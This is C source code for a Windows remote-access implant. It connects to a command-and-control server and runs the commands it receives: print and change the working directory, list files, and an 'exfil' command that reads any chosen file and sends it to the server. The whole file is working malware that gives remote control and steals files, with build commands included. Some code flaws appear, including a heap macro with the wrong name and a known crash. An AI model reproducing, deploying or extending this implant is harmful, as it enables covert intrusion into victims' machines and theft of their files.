#include "c2_comms.h"



// Global heap handle
HANDLE heap;
#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
#define Free(ptr) HeapFree(HEAP, 0, (ptr));

// Present working directory, globally accessible
char PWD[MAX_PATH + 1] = {0};

// Attempt to change the PWD to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {
    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        c2_log("PATH: %s   LEN: %d\n", path, len);
        memset(PWD, 0, MAX_PATH + 1);
        strncpy(PWD, path, len);
        PathAddBackslashA(PWD); // Append trailing \ to path if needed
        c2_log("PWD: %s\n", PWD);
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}


// Write file + directory listing to out
// TODO: segfaults on directories with lots of entries (ex: C:\Windows\System32)
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH + 4];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer + append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    
    FindClose(h);
    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}
 

// Reads data from file given by path and sends it back to C2 server
int exfil(char* path) {
    char abs_path[MAX_PATH + 1] = {0};
    DWORD numBytesRead = 0;
    DWORD numBytesSent = 0;
    LARGE_INTEGER fileSize;

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", PWD, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    // Open file
    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        numBytesSent = 0;
        goto end;
    }

    // Get file size
    int low = 0;
    low = GetFileSize(hFile, &fileSize.HighPart);
    fileSize.LowPart = low;

    // Allocate buffer on heap for the data
    char* out = (char*) Malloc(fileSize.QuadPart);
    if (out == NULL) {
        numBytesSent = 0;
        goto end;
    }

    // Read data
    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
    if (!res) {
        numBytesSent = 0;
        goto end;
    }
    numBytesSent = c2_exfil(out, numBytesRead);

end:
    Free(out);
    CloseHandle(hFile);
    return numBytesSent;
}





// cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
// cl implant.c /Fe:implant.exe
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};


    // Network setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] ERROR in comms setup\n");
        TearDownComms();
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");

    // Other setup
    heap = GetProcessHeap();
    GetCurrentDirectory(_MAX_PATH, PWD);

    
    c2_send("READY", 5); // we need an initial send so we can get a corresponding response
    while (1) {
        // Recv data
        int n = c2_recv(buffer, 1024);
        if (n <= 0) {
            c2_log("[!] Didn't receive any data!\n");
            continue;
        }


        c2_log("RECV: %s\n", buffer);


        // Main logic of implant
        // Note: to maintain synchronization between requests and responses, always need to send something back to server
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        else if (strncmp(buffer, "pwd", 3) == 0) {
            c2_send(PWD, strlen(PWD));
        }

        else if(strncmp(buffer, "cd ", 3) == 0 && n >= 4) {
            if (change_dir(buffer + 3, n - 3)) { // buffer + 3 is start of arg passed to cd
                c2_send(PWD, strlen(PWD));
            }
            else { c2_send("[!] Invalid dir", 15); }
        }

        else if(strncmp(buffer, "ls", 2) == 0) {
            char listing[4096] = {0};
            if (n == 2)
                status = ls(PWD, listing);
            else if (n >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(listing, strlen(listing));
            }
            else {
                c2_send("[!] Error in ls", 15);
            }
        }

        else if(strncmp(buffer, "exfil ", 6) == 0) {
            if (n >= 7) {
                status = exfil(buffer + 6);
                if (status > 0) { c2_send("OK", 2); }
                else { c2_send("[!] exfil error", 15); }
            }
            else {
                c2_send("[!] No arg", 10);
            }
        }

        else {
            c2_send("[!] Invalid command", 19);
        }

        
        

        // Clear buffer
        memset(buffer, 0, 1024);
    }
    





    TearDownComms();
    return 0;
}
